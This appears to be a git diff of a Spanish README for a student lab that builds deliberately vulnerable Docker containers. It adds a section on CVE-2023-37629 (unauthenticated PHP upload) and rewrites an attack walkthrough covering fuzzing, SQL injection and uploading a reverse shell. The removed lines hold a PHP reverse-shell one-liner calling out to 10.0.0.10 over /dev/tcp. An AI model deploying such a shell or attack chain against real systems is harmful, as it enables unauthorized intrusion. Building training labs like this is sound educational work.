@@ -17,10 +17,8 @@
     - [Instalacion de Docker](#instalacion-de-docker)
 
 6. [Contenedor Numero 1 Inyección](#contenedor-numero-1-inyección)
-    - [Desarrollo de la Vulnerabilidad Principal](#desarrollo-de-la-vulnerabilidad-principal)
     - [Vulnerabilidades CVE Extra](#vulnerabilidades-cve-extra)
-    - [Desarrollo de las Vulnerabilidades Extra](#desarrollo-de-las-vulnerabilidades-extra)
-    - [Proceso de explotación de las vulnerabilidades](#proceso-de-explotación-de-las-vulnerabilidades)
+    - [Desarrollo de la Vulnerabilidad](#desarrollo-de-la-vulnerabilidad)
     - [Análisis del Contenedor una vez Explotado](#análisis-del-contenedor-una-vez-explotado)
     - [Herramientas Empleadas](#herramientas-empleadas)
 7. [Contenedor Numero 2 Fallas de Identificación y Autenticación](#contenedor-numero-2-fallas-de-identificación-y-autenticación)
@@ -228,22 +226,34 @@ El sistema operativo utilizado para el desarrollo de este primer contenedor es U
 <img  alt="drawing" width="350" height="200" src="https://blogs.zeiss.com/digital-innovation/de/wp-content/uploads/sites/2/2020/05/201909_Security_SQL-Injection_1.png" />
 </p>
 
+## [Vulnerabilidades CVE Extra](#índice)
 
-## [Desarrollo de la Vulnerabilidad Principal](#índice)
+Para comenzar con la búsqueda de las CVEs añadidas como extra en la máquina, hay que tener en cuenta los siguientes puntos:
+- **La CVE debe ser del año 2023 o posterior**
+- **La CVE debe ser reproducible**
+- **La CVE debe tener un exploit desarrollado**
 
-1.Atacante hace fuzzing y encuentra el panel de inicio de cerdos (/login)
+CVEs elegidas para su reproducción:
+- **File update (CVE-2023-37629)**
+ 
+**Que es CVE-2023-37629?** 
+
+Esta vulnerablidad es sobre la carga de archivos. Un usuario no autenticado puede cargar un archivo php.
+
+
+**La solucion para CVE-2023-37629?**
+
+Actualizar los programas o filtrar y limitar los paquetes subidos por el usuario
+
+
+## [Desarrollo de la Vulnerabilidad](#índice)
+
+1.Atacante hace fuzzing y encuentra el panel de inicio de cerdos 
 
 2.El atacante consigue entrar en el panel (via sqli, fuerza bruta, dupeando la db...) y hace File Upload (para subir una Reverse Shell) y
 entrar como el usuario www-data.
 
-3.Una vez dentro del contenedor con el usuario www-data listas archivos y vainas y encuentras un archivo oculto (.rutaFinal) que te redirije al login in del "Banco De Credenciales" (/loginGranjaCredencialesSecretas)
-
-4.Mediante SQLi bypasseas el login y te redirige a una web con varias credenciales de varios usuarios (solo funciona 1)
-
-5.Entra con ese usuario funcional mediante SSH al contenedor, aquí se encuentra la flag user.txt dentro de la home
-<?php
-exec("/bin/bash -c 'bash -i > /dev/tcp/10.0.0.10/1234 0>&1'"); ?
-
+3.Una vez dentro del contenedor con el usuario www-data listas archivos y vainas y encuentras un archivo oculto (.rutaFinal) que te redirije al login in del "Banco De Credenciales" (
 
 
 
@@ -253,4 +263,20 @@ En primer lugar desarrollamos un formulario de inicio de sesión con su respecti
 <img  alt="drawing" width="400" height="400" src="https://i.imgur.com/u74Zyuj.png"/>
 </p>
 
-En segundo lugar instalamos MariaDB para gestionar las bases de datos que estarán conectadas al formulario. Tras crear las bases de datos con sus respectivos usuarios y verificar la conexión y el buen funcionamiento con el formulario, damos por finalizado la implementación de la vulnerabilidad principal en este contenedor.
+
+En segundo lugar instalamos MariaDB para gestionar las bases de datos que estarán conectadas al formulario. 
+
+
+Tras crear las bases de datos con sus respectivos usuarios y verificar la conexión y el buen funcionamiento con el formulario, damos por finalizado la implementación de la vulnerabilidad principal en este contenedor.
+
+
+
+
+
+## [Análisis del Contenedor una vez Explotado](#índice)
+
+### [Herramientas Empleadas](#índice)
+
+# [Contenedor Numero 2 Fallas de Identificación y Autenticación](#índice)
+
+
